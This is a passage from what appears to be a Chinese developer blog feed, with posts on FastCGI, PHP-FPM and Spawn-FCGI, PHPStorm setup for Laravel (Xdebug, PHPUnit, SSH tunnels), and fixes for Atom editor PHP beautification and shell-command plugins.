<li><p>FastCGIFastCGI 像是一个常驻 (long-live) 型的 CGI，它可以一直执行着，只要激活后，不会每次 都要花费时间去 fork 一次（这是 CGI 最为人诟病的 fork-and-execute 模式）。它还支持分布式的运算，即 FastCGI 程序可以在网站服务器以外的主机上执行并且接受来自其它网站服务器来的请求。FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持 在内存中并因此获得较高的性能。众所周知，CGI 解释器的反复加载是 CGI 性能低下的主要原因，如果 CGI 解 释器保持在内存中并接受 FastCGI 进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over 特性等等 。FastCGI 也可以称为是一种协议标准，比如下面要说的 php-fpm 就是支持解析 php 的 一个 fastCGI 进程管理器 &#x2F; 引擎。</p>
</li>
<li><p>FastCGI 特点 FastCGI 具有语言无关性.FastCGI 在进程中的应用程序，独立于核心 web 服务器运行，提供了一 个比 API 更安全的环境。APIs 把应用程序的代码与核心的 web 服务器链接在一起，这意味着在一个错误的 API 的应用程序可能会损坏其他应用程序或核心服务器。 恶意的 API 的应用程序代码甚至可以窃取另一个应用 程序或核心服务器的密钥。FastCGI 技术目前支持语言有：C&#x2F;C++、Java、Perl、Tcl、Python、 SmallTalk、Ruby 等。相关模块在 Apache, ISS, Lighttpd 等流行的服务器上也是可用的。FastCGI 的不依赖于任何 Web 服务器的内部架构，因此即使服务器技术 的变化，FastCGI 依然稳定不变。</p>
</li>
<li><p>FastCGI 的工作原理 Web Server 启动时载入 FastCGI 进程管理器（IIS ISAPI 或 Apache Module) FastCGI 进程管理器自身初始化，启动多个 CGI 解释器进程 (可见多个 php-cgi) 并等待来自 Web Server 的连接。当客户端请求到达 Web Server 时，FastCGI 进程管理器选择并连接到一 个 CGI 解释器。Web server 将 CGI 环境变量和标准输入发送到 FastCGI 子进程 php-cgi。FastCGI 子进程完成处理后将标准输出和错误信息从同一连接返回 Web Server。当 FastCGI 子进程关闭连接时，请求便告处理完成。FastCGI 子进程接着等待并处理来自 FastCGI 进 程管理器 (运行在 Web Server 中) 的下一个连接。 在 CGI 模式中，php-cgi 在此便退出了。在上述情况中，你可以想象 CGI 通常有多慢。每一个 Web 请求 PHP 都必须重新解析 php.ini 、重新载入全部扩展并重初始化全部数据结构。使用 FastCGI，所有这些都只在进程启动时发生一次。一个 额外的好处是，持续数据库连接 (Persistent database connection) 可以工作。</p>
</li>
<li><p>FastCGI 的不足因为是多进程，所以比 CGI 多线程消耗更多的服务器内存，PHP-CGI 解释器每进程消耗 7 至 25 兆内存，将这个数字乘以 50 或 100 就是很大的内存数。Nginx 0.8.46+PHP 5.2.14 (FastCGI) 服务器在 3 万并发连接下，开启的 10 个 Nginx 进程消 耗 150M 内存（15M<em>10&#x3D;150M），开启的 64 个 php-cgi 进程消耗 1280M 内存（20M</em>64&#x3D;1280M），加上系统自身消 耗的内存，总共消耗不到 2GB 内存。如果服务器内存较小，完全可以只开启 25 个 php-cgi 进程，这样 php-cgi 消耗的总内存数才 500M。上面的数据摘自 Nginx 0.8.x + PHP 5.2.13 (FastCGI) 搭建胜过 Apache 十倍的 Web 服务器 (第 6 版)</p>
</li>
<li><p>PHP-CGIPHP-CGI 是 PHP 自带的 FastCGI 管理器。PHP-CGI 的不足：php-cgi 变更 php.ini 配置后需重启 php-cgi 才能让新的 php-ini 生效， 不可以平滑重启。直接杀死 php-cgi 进程，php 就不能运行了。(PHP-FPM 和 Spawn-FCGI 就 没有这个问题，守护进程会平滑从新生成新的子进程。）</p>
</li>
<li><p>PHP-FPMPHP-FPM 是一个 PHP FastCGI 管理器，是只用于 PHP 的，可以在 <span class="exturl" data-url="aHR0cDovL3BocC0v">http://php-<i class="fa fa-external-link-alt"></i></span> fpm.org&#x2F;download 下载得到。PHP-FPM 其实是 PHP 源代码的一个补丁，旨在将 FastCGI 进程管理整合进 PHP 包中。必须将 它 patch 到你的 PHP 源代码中，在编译安装 PHP 后才可以使用。现在我们可以在最新的 PHP 5.3.2 的源码树里下载得到直接整合了 PHP-FPM 的分支，据说下个版本会融合进 PHP 的主分支去。相对 Spawn-FCGI，PHP-FPM 在 CPU 和内存方面的控制都更胜一筹，而且前者很容易崩溃，必须用 crontab 进行监控，而 PHP-FPM 则没有这种烦恼。PHP5.3.3 已经集成 php-fpm 了，不再是第三方的包了。PHP-FPM 提供了更好的 PHP 进程管理 方式，可以有效控制内存和进程、可以平滑重载 PHP 配置，比 spawn-fcgi 具有更多有点，所以被 PHP 官方收 录了。在.&#x2F;configure 的时候带 –enable-fpm 参数即可开启 PHP-FPM。</p>
</li>
<li><p>Spawn-FCGISpawn-FCGI 是一个通用的 FastCGI 管理服务器，它是 lighttpd 中的一部份，很多人都用 Lighttpd 的 Spawn-FCGI 进行 FastCGI 模式下的管理工作，不过有不少缺点。而 PHP-FPM 的出现多少缓解了一些问题，但 PHP-FPM 有个缺点就是要重新编译，这对于一些已经运行的环境可能有不小的风险 (refer)，在 php 5.3.3 中可以直接使用 PHP-FPM 了。</p>
<p>Spawn-FCGI 目前已经独成为一个项目，更加稳定一些，也给很多 Web 站点的配置带来便利。已经有不少站点将它与 nginx 搭配来解决动态网页。</p>
</li>
<li><p>PHP-FPM 与 spawn-CGI 对比 PHP-FPM 的使用非常方便，配置都是在 PHP-FPM.ini 的文件内，而启动、重启都可以从 php&#x2F;sbin&#x2F;PHP-FPM 中进行。更方便的是修改 php.ini 后可以直接使用 PHP-FPM reload 进行加载，无需杀掉进 程就可以完成 php.ini 的修改加载结果显示使用 PHP-FPM 可以使 php 有不小的性能提升。PHP-FPM 控制的进程 cpu 回收的速度比较慢，内存分配的 很均匀。Spawn-FCGI 控制的进程 CPU 下降的很快，而内存分配的比较不均匀。有很多进程似乎未分配到，而另外一些 却占用很高。可能是由于进程任务分配的不均匀导致的。而这也导致了总体响应速度的下降。而 PHP-FPM 合 理的分配，导致总体响应的提到以及任务的平均。</p>
</li>
<li><p>总结：fastCGI 是 nginx 和 php 之间的一个通信接口，该接口实际处理过程通过启动 php-fpm 进程来解 析 php 脚本，即 php-fpm 相 当于一个动态应用服务器，从而实现 nginx 动态解析 php。因此，如果 nginx 服务器需要支 持 php 解析，需要在 nginx.conf 中增加 php 的配置：将 php 脚本转发到 fastCGI 进程监听的 IP 地址和端口 （php-fpm.conf 中指定）。同时，php 安装的时候，需要开启支持 fastCGI 选项，并且编译安装 php-fpm 补丁 &#x2F; 扩展，同时，需要启动 php-fpm 进程，才可 以解析 nginx 通过 fastCGI 转发过来的 php 脚本。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
  </entry>
  <entry>
    <title>Php 缩略图生成类，支持 ImageMagick 及 gd 库两种处理</title>
    <url>/2017/05/php-image/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>参考资料链接 <span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS81NTUzNC5odG0=">生成缩略图<i class="fa fa-external-link-alt"></i></span></p>
<p>具体代码和实现方式这个连接中都有，具体的也是只能根据本地服务器的路经的图片生成缩略图，加水印之类的。根据其他服务器上的图片好像根本无法生成缩略图。</p>
<span id="more"></span>

<p>里面的代码我做了点小小的改动， 让缩略图实现方面更加简便。</p>
<p>具体 详细代码请阅读：    </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vc2xhZ2dhL0Jhc2UtMjAxNy90cmVlL21hc3Rlci9jcmVhdGVfdGh1bWI=">https://gitee.com/slagga/Base-2017/tree/master/create_thumb<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>ImageMagick</tag>
      </tags>
  </entry>
  <entry>
    <title>基于 PHPStorm 编辑器的 Laravel 开发</title>
    <url>/2017/05/phpstorm-laravel/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文主要讲述在 PHPStorm 编辑器中如何使用 PHPStorm 的 Laravel 插件和 Laravel IDE Helper 来开发 Laravel 程序。</p>
<p>结合个人积累的一点经验来说明使用 PHPStorm 编辑器来开发程序还是很顺手的，内容主要基于 PHPStorm 官方文档 Laravel Development using PhpStorm。</p>
<span id="more"></span>

<h2 id="学习主题"><a href="#学习主题" class="headerlink" title="学习主题"></a>学习主题</h2><p>本文主要涉及以下几个技巧：</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">Composer 的初始化</span><br><span class="line"></span><br><span class="line">Laravel IDE <span class="keyword">Helper</span> 的安装</span><br><span class="line"></span><br><span class="line">Laravel Plugin 的安装</span><br><span class="line"></span><br><span class="line">PHPStorm 对 Laravel 框架的支持</span><br><span class="line"></span><br><span class="line">PHPStorm 对 Blade 模板引擎的支持</span><br><span class="line"></span><br><span class="line">使用 PHPStorm 调试 Laravel 程序</span><br><span class="line"></span><br><span class="line">使用 PHPStorm 的单元测试功能</span><br><span class="line"></span><br><span class="line">使用 PHPStorm 的数据库功能</span><br></pre></td></tr></table></figure>

<h2 id="1、一些准备工作"><a href="#1、一些准备工作" class="headerlink" title="1、一些准备工作"></a>1、一些准备工作</h2><p>(1)、初始化 composer</p>
<p>PHPStorm 提供了 composer 配置功能，可以在 PHPStorm 新建一个空项目，然后在空项目根目录右键选择 Composer|Init Composer…，然后点击从 getcomposer.org 网上下载，PHPStorm 会自动下载 composer.phar 文件，并在项目根目录下生成 composer.json 文件，速度也很快。</p>
<p>对于 composer.json 文件中数组 key 字段值可以在 Composer 官网上查找相关解释，包括重要的 require 和 require-dev 字段解释。</p>
<p>(2)、安装 Laravel IDE Helper</p>
<p>安装也很简单，还是在项目根目录右键找到 Composer 选择 Add Dependancy…，搜索 laravel-ide-helper 选择安装就行，如果 composer.json 文件中 “minimum-stability”:”stable” 那就必须要安装个稳定版的，我这里选择 v2.1.2 稳定版。安装后就会在根目录下自动生成一个 vendor 文件夹，该文件夹存放各种依赖包。当然也可直接在 composer.json 里添加上 require 字段值及对应的 laravel-ide-helper 值，再 php composer.phar composer.json update 就行，具体可以去 packagist.org 里去搜 laravel-ide-helper 找对应的安装方法。</p>
<p>其实，Laravel IDE Helper 就是一个第三方安装包，安装后会有些代码提示等一些好处，也可选择不安装，当然安装也比较简单。安装后需要在 config&#x2F;app.php 里注册下 Service Provider 就行：</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="string">&#x27;providers&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="string">&#x27;Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider&#x27;</span>, <span class="comment">// Laravel IDE helper</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>Laracasts 官网上有一个有关 Laravel Ide Helper 的视频，可以看下，PHPStorm’s Laravel Facades Issue</p>
<p>(3)、安装 Laravel Plugin</p>
<p>选择 Preference 或者 Command + ,，选择下方的 Browse repositories… 浏览插件仓库，并选择安装 Laravel Plugin，并重启 PHPStorm 就行，最后在 Preference|Other Settings|Laravel Plugin 里选择 enable plugin for this project 再重启下 PHPStorm 就 OK 了。</p>
<p>So，安装 Laravel Plugin 有啥好处没：主要就是代码补全。针对 Routes&#x2F;Controllers&#x2F;Views&#x2F;Configuration&#x2F;Services&#x2F;Translations 的代码补全，比较方便而已，懒得装也可以不装。</p>
<p>效率会高很多，而且安装也很简单，装一个也无妨嘛。</p>
<h2 id="2、PHPStorm-对-Blade-模板支持"><a href="#2、PHPStorm-对-Blade-模板支持" class="headerlink" title="2、PHPStorm 对 Blade 模板支持"></a>2、PHPStorm 对 Blade 模板支持</h2><p>PHPStorm 提供了对 Blade 模板语法高亮，而且还包括一些指令的补全和浏览，如 @include&#x2F;@section&#x2F;@extends 等等，写代码时很方便。</p>
<p>总的来说，PHPStorm 对 Blade 模板的代码提示和补全还是支持的比较好的，使用很顺手。</p>
<p>这里，还推荐一个 Laravel Live Templates for PhpStorm，安装地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tvb21haS9waHAuLi4lRUYlQkMlOEMlRTglQkYlOTklRTQlQjglQUElRTUlQjAlOEYlRTQlQkUlOUQlRTglQjUlOTYlRTUlOEMlODUlRTQlQjklOUYlRTYlQUYlOTQlRTglQkUlODMlRTUlQTUlQkQlRTclOTQlQTglRUYlQkMlOEMlRTUlQkIlQkElRTglQUUlQUUlRTUlOUMlQTg=">https://github.com/koomai/php...，这个小依赖包也比较好用，建议在<i class="fa fa-external-link-alt"></i></span> PHPStorm 中安装下，安装方法和好处可以进去看看，安装很简单。</p>
<h2 id="3、使用-Xdebug-来调试-Laravel-程序"><a href="#3、使用-Xdebug-来调试-Laravel-程序" class="headerlink" title="3、使用 Xdebug 来调试 Laravel 程序"></a>3、使用 Xdebug 来调试 Laravel 程序</h2><p>Xdebug 是调试 PHP 程序的神器，尤其在调试 Laravel 代码时会非常有用。在 PHPStorm 中配置 Xdebug 也很简单，首先看下 PHP 版本中是否安装了 Xdebug 扩展：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">php -m</span><br><span class="line"></span><br><span class="line">[PHP Modules]</span><br><span class="line">apcu</span><br><span class="line">bcmath</span><br><span class="line">bz2</span><br><span class="line">calendar</span><br><span class="line">Core</span><br><span class="line">ctype</span><br><span class="line">curl</span><br><span class="line"><span class="type">date</span></span><br><span class="line">dom</span><br><span class="line">exif</span><br><span class="line">fileinfo</span><br><span class="line"><span class="keyword">filter</span></span><br><span class="line">ftp</span><br><span class="line">gd</span><br><span class="line">gettext</span><br><span class="line">gmp</span><br><span class="line">hash</span><br><span class="line">http</span><br><span class="line">iconv</span><br><span class="line">imap</span><br><span class="line">intl</span><br><span class="line"><span class="type">json</span></span><br><span class="line">ldap</span><br><span class="line">libxml</span><br><span class="line">mbstring</span><br><span class="line">mcrypt</span><br><span class="line">mysqli</span><br><span class="line">mysqlnd</span><br><span class="line">openssl</span><br><span class="line">pcntl</span><br><span class="line">pcre</span><br><span class="line">PDO</span><br><span class="line">pdo_mysql</span><br><span class="line">pdo_pgsql</span><br><span class="line">pdo_sqlite</span><br><span class="line">pgsql</span><br><span class="line">Phar</span><br><span class="line">posix</span><br><span class="line">propro</span><br><span class="line">raphf</span><br><span class="line">readline</span><br><span class="line">Reflection</span><br><span class="line"><span class="keyword">session</span></span><br><span class="line">shmop</span><br><span class="line">SimpleXML</span><br><span class="line">soap</span><br><span class="line">sockets</span><br><span class="line">SPL</span><br><span class="line">sqlite3</span><br><span class="line">standard</span><br><span class="line">sysvmsg</span><br><span class="line">sysvsem</span><br><span class="line">sysvshm</span><br><span class="line">tidy</span><br><span class="line">tokenizer</span><br><span class="line">wddx</span><br><span class="line">xdebug</span><br><span class="line"><span class="type">xml</span></span><br><span class="line">xmlreader</span><br><span class="line">xmlrpc</span><br><span class="line">xmlwriter</span><br><span class="line">xsl</span><br><span class="line">Zend OPcache</span><br><span class="line">zip</span><br><span class="line">zlib</span><br><span class="line"></span><br><span class="line">[Zend Modules]</span><br><span class="line">Xdebug</span><br><span class="line">Zend OPcache</span><br></pre></td></tr></table></figure>

<p>如果没有装 Xdebug 扩展的话需要装一下，装完后修改下 php.ini 把 xdebug.so 前的路径 ‘;’ 去掉，并重启下 PHP 就行。如果你是本地开发，是 MAC 系统的话，可以装集成环境 MAMP，该 PHP 中都有 xdebug.so，不过需要使能下 php.ini 中 xdebug 扩展。</p>
<p>安装好后 xdebug 后，需要配置下 PHP。</p>
<p>使能下 PHPStorm 中 Debug Listening: 点击 Run-&gt;Start listening for PHP Debug Connections，然后点击右上角的下三角设置下。</p>
<p>可以选择新建一个 PHP Web Application 或者 PHP Script，选择 PHP Web Application 的话需要配置下 Server，默认本地开发并且路由为 localhost。</p>
<p>然后点击右上角的爬虫图标执行调试，并且各个变量值在调试控制台中显示。</p>
<p>大概聊了下在 PHPStorm 中配置 Xdebug，不管咋样，一定要配置好 Xdebug，这在平时读代码尤其 Laravel 源码时会非常有用。</p>
<h2 id="4、使用-PHPUnit-单元测试-Laravel-程序"><a href="#4、使用-PHPUnit-单元测试-Laravel-程序" class="headerlink" title="4、使用 PHPUnit 单元测试 Laravel 程序"></a>4、使用 PHPUnit 单元测试 Laravel 程序</h2><p>首先需要在本地安装下 PHPUnit：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://phar.phpunit.de/phpunit.phar</span><br><span class="line"><span class="built_in">chmod</span> +x phpunit.phar</span><br><span class="line">sudo <span class="built_in">mv</span> phpunit.phar /usr/local/bin/phpunit</span><br><span class="line">phpunit --version</span><br></pre></td></tr></table></figure>

<p>然后在 PHPStorm 中配置下 PHPUnit。</p>
<p>Configuration file 指向本地的 phpunit.xml.dist 文件，该文件是用来配置 phpunit 的测试套件的，可以看官网中文版的：[用 XML 配置来编排测试套件][16]，比如本人这里的套件配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">phpunit</span> <span class="attr">backupGlobals</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">backupStaticAttributes</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">bootstrap</span>=<span class="string">&quot;vendor/autoload.php&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">colors</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">convertErrorsToExceptions</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">convertNoticesToExceptions</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">convertWarningsToExceptions</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">processIsolation</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">stopOnFailure</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">syntaxCheck</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">verbose</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">testsuites</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testsuite</span> <span class="attr">name</span>=<span class="string">&quot;flysystem/tests&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span> <span class="attr">suffix</span>=<span class="string">&quot;.php&quot;</span>&gt;</span>./tests/<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">testsuite</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">testsuites</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span> <span class="attr">suffix</span>=<span class="string">&quot;.php&quot;</span>&gt;</span>./src/<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listeners</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener</span> <span class="attr">class</span>=<span class="string">&quot;Mockery\Adapter\Phpunit\TestListener&quot;</span> <span class="attr">file</span>=<span class="string">&quot;./vendor/mockery/mockery/library/Mockery/Adapter/Phpunit/TestListener.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listeners</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logging</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;log type=&quot;coverage-text&quot; target=&quot;php://stdout&quot; showUncoveredFiles=&quot;true&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;log type=&quot;coverage-html&quot; target=&quot;coverage&quot; showUncoveredFiles=&quot;true&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;log type=&quot;coverage-clover&quot; target=&quot;coverage.xml&quot; showUncoveredFiles=&quot;true&quot;/&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">phpunit</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在写好 PHPUnit 测试后，可以在终端执行 phpunit 命令就行，或者单独执行某个测试类，可以在测试类里右键选择 Run xxxTest.php 就行。</p>
<p>写测试还是很有必要的，而且是必须的。PHPUnit写测试，以后还会详聊。</p>
<h2 id="5、使用-PHPStorm-的-Database-链接-Laravel-程序数据库"><a href="#5、使用-PHPStorm-的-Database-链接-Laravel-程序数据库" class="headerlink" title="5、使用 PHPStorm 的 Database 链接 Laravel 程序数据库"></a>5、使用 PHPStorm 的 Database 链接 Laravel 程序数据库</h2><p>PHPStorm 中提供了 database 插件，功能也比较强大，我想用过 PHPStorm 的应该都知道如何使用，这里聊下一个很好用的一个功能。经常遇到这样的一个情景：数据库装在数据库服务器 db.test.com 中，但本地是登陆不上去的，但在开发服务器 host.company.com 是可以链接数据库服务器的，那如何使用 database 来连接数据库服务器呢？</p>
<p>可以通过 SSH tunnel 来连接。</p>
<p>这里 Auth type 可以选择 Password 或者 Key Pair，如果你是通过密码登录开发服务器的，选择 Password；如果是通过密钥登陆的，选择 Key Pair。然后在 general tab 中配置下数据库服务器就 OK 了。</p>
<p>PHPStorm 还提供了 Remote Host 插件来链接远程服务器，点击 Tools-&gt;Deployment-&gt;Browse Remote Host 就可看到，这个插件和 Database 一样同样的方便看服务器的东西，并可以在本地修改病 Upload 到服务器上，而不用在 Terminal 中登录到远程服务器，在 Terminal 上查看修改东西。</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>PhpStorm</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>Atom 编辑器 atom-beautify 美化 php 遇到的问题及解决办法</title>
    <url>/2017/06/github-atom-beautify/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>问题不复杂，但对于不熟悉 atom-beautify 的人来说，却很难在网上找到比较完整的解决办法，特别是第二个问题。</p>
<p>网上答案基本都是隐晦的提到 “环境变量” 或 “找不到 php” 就止步了，并没有帮助疑惑者一次性解决问题。</p>
<span id="more"></span>

<h2 id="1-问题：对含有-php-代码的文件进行美化时，报错提示"><a href="#1-问题：对含有-php-代码的文件进行美化时，报错提示" class="headerlink" title="1. 问题：对含有 php 代码的文件进行美化时，报错提示"></a>1. 问题：对含有 php 代码的文件进行美化时，报错提示</h2><p>Could not find ‘php-cs-fixer’. The program may not be installed.</p>
<p>（1）原因：没有安装 php-cs-fixer</p>
<p>（2）解决办法：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">① 下载 php-<span class="keyword">cs</span>-fixer.phar 文件，并把它放在某个目录中（放哪里都可以，主要是下一步能够引用这个文件即可）（更多关于 php-<span class="keyword">cs</span>-fixer 的信息：https:<span class="comment">//github.com/FriendsOfPHP/PHP-CS-Fixer）</span></span><br><span class="line"></span><br><span class="line">② 打开 Atom，进入 atom-beauty 插件的设置页面，展开其中的 PHP 设置项，把 PHP-<span class="keyword">CS</span>-Fixer 项的值设为上一步所下载的那个文件的路径。如下：</span><br></pre></td></tr></table></figure>

<h2 id="2、-问题：对含有-php-代码的文件进行美化时，报错提示"><a href="#2、-问题：对含有-php-代码的文件进行美化时，报错提示" class="headerlink" title="2、 问题：对含有 php 代码的文件进行美化时，报错提示"></a>2、 问题：对含有 php 代码的文件进行美化时，报错提示</h2><p>Could not find ‘php’. The program may not be installed.</p>
<p>（1）原因：正如提示所说，找不到 php 程序（来对 php 代码进行编译？）</p>
<p>（2）解决办法：把 php 程序所在文件夹加入到环境变量中。win10 设置环境变量办法（更详细步骤参考：<span class="exturl" data-url="aHR0cDovL2ppbmd5YW4uYmFpZHUuY29tL2FydGljbGUvYWQzMTBlODBkMmViZTMxODQ4ZjQ5ZTU5Lmh0bWwlRUYlQkMlODk=">http://jingyan.baidu.com/article/ad310e80d2ebe31848f49e59.html）<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">键任务栏上的 <span class="variable">windows</span> 图标</span><br><span class="line">控制面板</span><br><span class="line">系统和安全</span><br><span class="line">系统</span><br><span class="line">高级系统设置</span><br><span class="line">高级</span><br><span class="line">环境变量</span><br><span class="line">选中 <span class="built_in">Path</span>，点击 “编辑”</span><br><span class="line">点击 “新建”， <span class="built_in">D</span><span class="operator">:</span>\<span class="variable">wamp</span>\<span class="variable">bin</span>\<span class="variable">php</span>\<span class="variable">php5</span><span class="number">.5</span><span class="number">.12</span> （我用的是 <span class="variable">Wamp</span> <span class="variable">Server</span>，所以找到 <span class="variable">wamp</span> 下的 <span class="variable">php</span> 文件夹）</span><br></pre></td></tr></table></figure>

<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dsYXZpbjAwMS9hdG9tLWJlYXV0aWZ5L2lzc3Vlcy83NTM=">https://github.com/Glavin001/atom-beautify/issues/753<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Atom</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Atom 编辑器前端开发实战</title>
    <url>/2017/06/github-atom/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Ubuntu</span> <span class="number">16</span>.<span class="number">04</span> <span class="number">64</span> 位</span><br><span class="line"><span class="attribute">github</span> atom <span class="number">1</span>.<span class="number">8</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">google</span>-chrome 版本 <span class="number">51</span>.<span class="number">0</span>.<span class="number">2704</span>.<span class="number">106</span> (<span class="number">64</span>-bit) deb 格式安装包</span><br><span class="line"><span class="attribute">node</span> <span class="number">4</span>.<span class="number">4</span>.<span class="number">4</span></span><br><span class="line"><span class="attribute">npm</span> <span class="number">2</span>.<span class="number">15</span>.<span class="number">1</span> </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>浏览器可以打开 github.com</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">github <span class="built_in">atom</span> </span><br><span class="line">google-chrome </span><br><span class="line"><span class="built_in">atom</span> 插件 - <span class="built_in">atom</span>-shell-commands 插件项目主页 https://<span class="built_in">atom</span>.io/packages/<span class="built_in">atom</span>-shell-commands</span><br></pre></td></tr></table></figure>

<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>打开命令行 (在桌面按下 Ctrl+Alt+T)，输入</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">$ apt <span class="keyword">install</span> atom-shell-commands</span><br></pre></td></tr></table></figure>

<p>等待一会儿安装成功</p>
<p>按插件主页的教程，用你最喜欢的方式打开文件 <code>~/.atom/config.cson</code>（修改前先备份），在最后插入以下内容，保存：</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">&quot;atom-shell-commands&quot;</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">commands</span><span class="punctuation">:</span> <span class="string">[</span></span><br><span class="line">    <span class="attribute">&#123;</span></span><br><span class="line"><span class="attribute">      name</span><span class="punctuation">:</span> <span class="string">&quot;open with chrome&quot;</span></span><br><span class="line">      <span class="attribute">command</span><span class="punctuation">:</span> <span class="string">&quot;google-chrome&quot;</span></span><br><span class="line">      <span class="attribute">arguments</span><span class="punctuation">:</span> <span class="string">[</span></span><br><span class="line">        <span class="attribute">&quot;&#123;FileName&#125;&quot;</span></span><br><span class="line"><span class="attribute">      ]</span></span><br><span class="line"><span class="attribute">      options</span><span class="punctuation">:</span></span><br><span class="line">        <span class="attribute">cwd</span><span class="punctuation">:</span> <span class="string">&quot;&#123;FileDir&#125;&quot;</span></span><br><span class="line">        <span class="attribute">keymap</span><span class="punctuation">:</span> <span class="string">&#x27;ctrl-2&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure>

<p>重启 atom，新建 foo.html，如下：</p>
